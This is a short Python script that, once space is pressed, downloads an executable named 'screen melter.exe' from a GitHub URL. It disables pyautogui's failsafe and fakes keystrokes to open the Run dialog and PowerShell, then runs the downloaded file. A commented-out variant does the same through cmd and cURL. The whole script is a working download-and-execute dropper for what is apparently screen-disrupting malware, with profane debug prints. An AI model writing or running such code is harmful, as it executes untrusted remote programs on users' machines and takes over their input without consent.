# import winsound
# import rotatescreen 
# from tkinter import *
# from tkinter import messagebox
# from multiprocessing import Process
import keyboard
import pyautogui
# import threading
import time
import urllib.request
# import random
pyautogui.FAILSAFE = False
url = 'https://github.com/theBusss/the-melter/raw/main/screen%20melter.exe'
fileName = 'melter.exe'

print('press space')
keyboard.wait('space')
print('fuck 1')
urllib.request.urlretrieve(url, fileName)
print('fuck 2')
time.sleep(2)
keyboard.press('win')
keyboard.press('r')
keyboard.release('r')
keyboard.release('win')
pyautogui.write('powershell')
pyautogui.press('enter')
time.sleep(.5)
pyautogui.write('.\melter.exe')
pyautogui.press('enter')


    # print("opening cmd")
    # keyboard.press('win')
    # keyboard.press('r')tt
    # keyboard.release('r')
    # keyboard.release('win')
    # time.sleep(.5)
    # pyautogui.write('cmd')
    # time.sleep(.5)
    # pyautogui.press('enter')
    # time.sleep(1) 
    # pyautogui.write('cURL https://github.com/theBusss/the-melter/raw/main/screen%20melter.exe -o melter.exe')
    # time.sleep(.5)
    # pyautogui.press('enter')
    # time.sleep(.5)
    # pyautogui.write('melter.exe')
    # pyautogui.press('enter')



#     import urllib

# url = '--insert-url--' 

# filename = 'download.exe'  
# urllib.urlretrieve(url, filename)